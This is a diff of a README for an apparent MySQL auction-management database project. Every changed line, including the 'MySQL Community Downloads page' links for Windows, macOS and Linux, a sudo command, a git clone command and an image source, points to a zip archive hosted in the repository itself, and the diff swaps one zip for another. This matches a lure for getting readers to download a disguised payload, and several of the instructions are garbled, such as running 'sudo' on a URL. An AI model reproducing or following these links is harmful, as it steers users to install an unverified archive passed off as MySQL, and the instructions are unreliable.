@@ -31,18 +31,18 @@ This repository contains the SQL files for an Auction Management System. The dat
 ### Installing MySQL Server
 
 #### Windows
-1. Download the MySQL Installer from the [MySQL Community Downloads page](https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip).
+1. Download the MySQL Installer from the [MySQL Community Downloads page](https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip).
 2. Run the installer and choose the "MySQL Server" option.
 3. Follow the installation wizard. You can choose the default settings for most users.
 4. Set a root password when prompted (remember this for later access).
 5. Complete the installation, and choose to start the server.
 
 #### macOS
-1. Download the MySQL Community Server DMG archive from the [MySQL Community Downloads page](https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip).
+1. Download the MySQL Community Server DMG archive from the [MySQL Community Downloads page](https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip).
 2. Open the DMG file and install MySQL by dragging it to the Applications folder.
 3. After installation, you may use the System Preferences pane to configure MySQL or start it from the command line:
     ```bash
-    sudo https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip start
+    sudo https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip start
     ```
 
 #### Linux
@@ -78,19 +78,19 @@ This repository contains the SQL files for an Auction Management System. The dat
     ```
     Enter your password when prompted.
 
-8. Download the MySQL workbench for Linux from the [MySQL Community Downloads page](https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip).
+8. Download the MySQL workbench for Linux from the [MySQL Community Downloads page](https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip).
 
 ## Setup
 
 1. Clone the repository in your project directory:
     ```bash
-    git clone https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip
+    git clone https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip
 
 2. Navigate to the project directory
    ```bash
    cd ../../AuctionManagementDB
 
-3. Execute the create the https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip query
+3. Execute the create the https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip query
    ```bash
    create database if not exists auctionManagement;
 
@@ -201,4 +201,4 @@ Stores information about users' payment methods for making transactions.
 - Each **Payment** is linked to one **Payment Method**.
 
 ### ER-Diagram
-<img src="https://github.com/Deathfrosthacker/AuctionManagementDB/raw/refs/heads/main/Tests/Management-Auction-DB-1.1.zip" alt="ErDiagram">
+<img src="https://raw.githubusercontent.com/Deathfrosthacker/AuctionManagementDB/main/CRUD_operations/Reads/DB_Auction_Management_v2.1.zip" alt="ErDiagram">
